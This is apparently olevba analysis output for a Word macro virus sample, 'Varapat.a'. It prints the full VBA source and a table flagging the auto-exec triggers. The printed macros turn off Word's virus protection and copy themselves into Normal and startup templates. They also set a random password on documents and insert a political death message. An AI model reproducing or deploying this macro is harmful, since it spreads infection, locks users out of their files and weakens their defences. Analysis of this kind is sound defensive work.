olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Varapat.a-010c3e0a9c982b82a0afb9535fafec3b9533c109
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Varapat.a-010c3e0a9c982b82a0afb9535fafec3b9533c109 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Reproduct.bas 
in file: Virus.MSWord.Varapat.a-010c3e0a9c982b82a0afb9535fafec3b9533c109 - OLE stream: 'Macros/VBA/Reproduct'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
Attribute AutoOpen.VB_Description = "Макрос создан 29.05.2005 Astovidad"
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.AutoOpen"
Repro
tyoi = Year(Date)
fdar = Day(Date)
grij = Minute(Time)
Dim treb
Randomize
treb = Int((25 * Rnd) + 1)
puuc = tyoi * grij * fdar * treb
If Day(Date) > 17 Then ActiveDocument.Password = (puuc)
If Day(Date) > 16 Then ActiveDocument.Content.InsertAfter Text:=" L. D. Kuchma must die. Best regards, Pativara. "
End Sub
Sub Pativara()
Attribute Pativara.VB_Description = "Макрос создан 29.05.2005 Astovidad"
Attribute Pativara.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.Pativara"
MsgBox "KUCHMA MUST DIE !"
If Day(Date) > 18 Then AutoClose
End Sub
Sub AutoClose()
Attribute AutoClose.VB_Description = "Макрос создан 29.05.2005 Astovidad"
Attribute AutoClose.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.AutoClose"
If Day(Date) > 18 Then MsgBox "ANTI-SEKRETUTKA by Pativara"
If Day(Date) > 17 Then Pativara
End Sub
Sub Repro()
Attribute Repro.VB_Description = "Макрос создан 29.05.2005 Astovidad"
Attribute Repro.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.Repro"
Application.Options.VirusProtection = False
On Error Resume Next
turs = Doc.Text.KillFiles
murt = Word.Application.Path + "\XLSTART\xlsmurt.drv"
biht = Glob.Matters.Appl + "C:\Windows"
murt = Word.Application.Path + "\STARTUP\winword.drv"
nart = Wording.Jump.Image1033.jpg
etun = Word.ActiveDocument.FullName
mute = Deltree.Format - C.Delete
srun = NormalData.Base.FullName
kapy = Normal.ThisDocument.FullName
kapu = Glob.ThisDocument.FullNam
hibr = "Reproduct"
tyja = "Regedit"
bers = "Reparation"
trir = "Repatriation"
hjbr = Add.Custom.Macro.FullName
If (Dir(murt) = "") Then
Application.Documents.Add
Application.Documents(1).SaveAs (murt)
Application.Documents(1).Close SaveChanges:=False
Word.RecentFiles.Item(1).Delete
End If
Application.OrganizerCopy Source:=etun, _
Destination:=murt, _
Name:=hibr, _
Object:=wdOrganizerObjectProjectItems
Application.OrganizerCopy Source:=etun, _
Destination:=kapy, _
Name:=hibr, _
Object:=wdOrganizerObjectProjectItems
Application.OrganizerCopy Source:=kapy, _
Destination:=murt, _
Name:=hibr, _
Object:=wdOrganizerObjectProjectItems
Application.OrganizerCopy Source:=murt, _
Destination:=etun, _
Name:=hibr, _
Object:=wdOrganizerObjectProjectItems
End Sub
Sub AutoExit()
AutoClose
End Sub
Sub ToolsMacro()
' Macro.Word.PATIVARA '
End Sub
Sub ViewSecurity()
' by Pativara B.-A. V., 2005 '
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
